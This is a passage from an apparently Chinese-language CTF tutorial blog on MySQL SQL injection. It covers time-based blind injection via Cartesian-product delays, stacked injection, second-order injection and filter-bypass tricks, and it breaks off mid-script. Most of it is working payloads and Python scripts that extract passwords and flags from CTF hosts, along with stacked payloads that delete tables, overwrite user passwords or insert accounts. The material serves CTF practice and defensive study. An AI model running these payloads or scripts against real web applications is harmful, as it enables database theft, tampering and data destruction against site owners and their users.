class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (2.08 sec)</span><br></pre></td></tr></table></figure><p>得到的结果都会有延迟。这里选用information_schema.columns表的原因是其内部数据较多，到时候可以根据实际情况调换。</p><p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[OUTPUT:]</span></span><br><span class="line"><span class="string">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span></span><br></pre></td></tr></table></figure><p>给出一个笛卡尔积延时注入脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot;</span> % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=<span class="literal">None</span>)    <span class="comment"># 不限制超时</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;504 Gateway Time-out&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在SQL中，分号; 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？ 因此这个想法也就造就了堆叠注入。</p><p>而联合注入也是将两条语句合并在一起，两者之间有什么区别么？</p><p>区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是查询语句，而堆叠注入可以执行的是任意的语句。 例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：select * from products where id&#x3D;1;DELETE FROM products; 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用 union 联合注入。</p><p>一般存在堆叠注入的都是由于使用 mysqli_multi_query() 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p><h3 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show databases;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show tables;--+</span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;show tables from database_name;--+</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;select load_file(&#x27;</span>/flag<span class="string">&#x27;);--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 修改数据表的结构</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password)values(20,<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;657260&#x27;</span>);--+    <span class="comment"># 插入数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users set password=&#x27;</span>657260<span class="string">&#x27; where id&gt;0;--+    # 更改数据</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span>;delete from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>=20;--+    <span class="comment"># 删除数据</span></span><br><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table fake_users like users;--+    # 创建一个新表</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>;rename table old_table to new_table;--+    <span class="comment"># 更改表名</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;;alter table users change old_column new_column varchar(100);--+    # 更改字段名</span></span><br></pre></td></tr></table></figure><p>下面是MySQL堆叠注入的几种常见姿势。</p><p>rename 修改表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;#</span></span><br><span class="line"><span class="string"># rename命令用于修改表名。</span></span><br><span class="line"><span class="string"># rename命令格式：rename table 原表名 to 新表名;</span></span><br></pre></td></tr></table></figure><p>rename&#x2F;alter 修改表名与字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rename命令用于修改表名。</span></span><br><span class="line"><span class="string">rename命令格式：rename table 原表名 to 新表名;</span></span><br></pre></td></tr></table></figure><p>利用 HANDLER 语句<br>如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。</p><p>HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭，详情请见：<a href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">https://www.cnblogs.com/taoyaostudy/p/13479367.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">1&#x27;</span>;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>堆叠注入中的盲注<br>堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还涉及到了一些json的内容，json.dumps() 是把python对象转换成json对象的一个过程，生成的是字符串。web服务中传输信息的一种方式。</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入用到的SQL语法知识<br>通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个能显示插入数据的回显的地方（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>需要对后端的SQL语句有一个猜测</p><p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，’database()’会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了’0’+database()+’0’这样的构造，但是这个的回显是0，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的’0’+hex(database())+’0’</p><h3 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先找到插入点，通常情况下是一个注册页面，register.php这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用from for语句来进行一个限制，可以编写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">&#x27;-&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">email,username</span>):</span><br><span class="line">    url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email, username = username,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">email</span>):</span><br><span class="line">    url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j)+<span class="string">&#x27;14&#x27;</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>,html.text,r.S)</span><br><span class="line">        hex_flag += <span class="built_in">str</span>(res[<span class="number">0</span>]).strip()</span><br><span class="line">        <span class="built_in">print</span>(hex_flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>( hex_flag.decode(<span class="string">&#x27;hex&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="结尾注释符绕过"><a href="#结尾注释符绕过" class="headerlink" title="结尾注释符绕过"></a>结尾注释符绕过</h3><p>Mysql中常见的注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">、<span class="comment">#    %23    --+或-- -    ;%00</span></span><br></pre></td></tr></table></figure><p>如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。</p><h3 id="字符串变换绕过"><a href="#字符串变换绕过" class="headerlink" title="字符串变换绕过"></a>字符串变换绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写绕过</span></span><br><span class="line">-1<span class="string">&#x27; UnIoN SeLeCt 1,2,database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 双写绕过</span></span><br><span class="line"><span class="string">-1&#x27;</span> uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串拼接绕过</span></span><br><span class="line">1<span class="string">&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span></span><br></pre></td></tr></table></figure><h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><p>管道符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="使用-进行异或盲注绕过"><a href="#使用-进行异或盲注绕过" class="headerlink" title="使用^进行异或盲注绕过"></a>使用^进行异或盲注绕过</h3><p>异或运算规则:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>1^1^1&#x3D;0 1^1^0&#x3D;0<br>构造payload:’^ascii(mid(database(),1,1)&#x3D;98)^0<br>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><p>以下字符可以代替空格：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用注释符/**/代替空格:</span></span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加号+代替空格:(只适用于GET方法中)</span></span><br><span class="line">select+database();</span><br><span class="line"><span class="comment"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使⽤括号嵌套:</span></span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)<span class="built_in">where</span>(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使⽤其他不可⻅字符代替空格:</span></span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用``分隔进行绕过</span></span><br><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p><h3 id="过滤括号绕过"><a href="#过滤括号绕过" class="headerlink" title="过滤括号绕过"></a>过滤括号绕过</h3><p>利用 order by 进行布尔盲注<br>上面有</p><h3 id="过滤比较符号（-x3D-、-lt-、-gt-）绕过"><a href="#过滤比较符号（-x3D-、-lt-、-gt-）绕过" class="headerlink" title="过滤比较符号（&#x3D;、&lt;、&gt;）绕过"></a>过滤比较符号（&#x3D;、&lt;、&gt;）绕过</h3><p>比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。</p><h3 id="使用-in-绕过"><a href="#使用-in-绕过" class="headerlink" title="使用 in() 绕过"></a>使用 in() 绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or ascii(substr((select database()),1,1)) <span class="keyword">in</span>(115)--+    // 正常回显</span><br><span class="line"></span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or substr((select database()),1,1) in(&#x27;</span>s<span class="string">&#x27;)--+    // 正常回显</span></span><br></pre></td></tr></table></figure><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>,<span class="number">128</span>):</span><br><span class="line">            url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h3><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 _ 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p><ol><li><p>判断数据库长度<br>可用length()函数，也可用_，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>________<span class="string">&#x27;--+  // 回显正常</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s%&#x27;</span> --+</span><br><span class="line">或者:</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s_______<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s_______&#x27;</span> --+</span><br></pre></td></tr></table></figure><p>如上图所示，回显正常，说明数据库名的第一个字符是s。</p></li></ol><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = 